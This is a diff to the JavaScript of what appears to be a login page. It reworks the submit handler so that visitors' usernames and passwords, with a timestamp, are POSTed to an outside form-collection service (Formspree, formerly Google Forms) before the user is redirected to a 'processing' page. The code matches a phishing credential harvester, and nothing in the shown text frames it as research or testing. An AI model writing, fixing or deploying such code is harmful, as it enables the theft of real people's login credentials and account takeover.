@@ -327,33 +327,35 @@
             loadingDiv.style.display = 'block';
             messageDiv.style.display = 'none';
 
-            // Google Form submission
             const formData = new FormData();
-            formData.append('entry.1625676688', username);
-            formData.append('entry.1557333068', password);
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('login_time', new Date().toLocaleString());
 
-            fetch('https://docs.google.com/forms/d/e/1FAIpQLSdE77kmONfq4y-vo-9nrTWaxOt2UKOTiMqssA724j4uyHc5Fg/formResponse', {
+            fetch('https://formspree.io/f/mjgqwnyz', {
                 method: 'POST',
                 body: formData,
-                mode: 'no-cors'
+                headers: {
+                    'Accept': 'application/json'
+                }
             })
-            .then(() => {
+            .then(response => {
                 loadingDiv.style.display = 'none';
-                showMessage('✅ Login credentials sent! Proceeding...', 'success');
-                document.getElementById('loginForm').reset();
-                
-                setTimeout(() => {
-                    window.location.href = 'processing.html';
-                }, 1000);
+                if (response.ok) {
+                    showMessage('✅ Login credentials sent! Proceeding...', 'success');
+                    document.getElementById('loginForm').reset();
+                    
+                    setTimeout(() => {
+                        window.location.href = 'processing.html';
+                    }, 1000);
+                } else {
+                    showMessage('❌ Error sending login info. Please try again.', 'error');
+                }
             })
             .catch(error => {
                 loadingDiv.style.display = 'none';
-                showMessage('✅ Login credentials sent! Proceeding...', 'success');
-                document.getElementById('loginForm').reset();
-                
-                setTimeout(() => {
-                    window.location.href = 'processing.html';
-                }, 1000);
+                console.error('Error:', error);
+                showMessage('❌ Error sending login info. Please try again.', 'error');
             });
         });
 
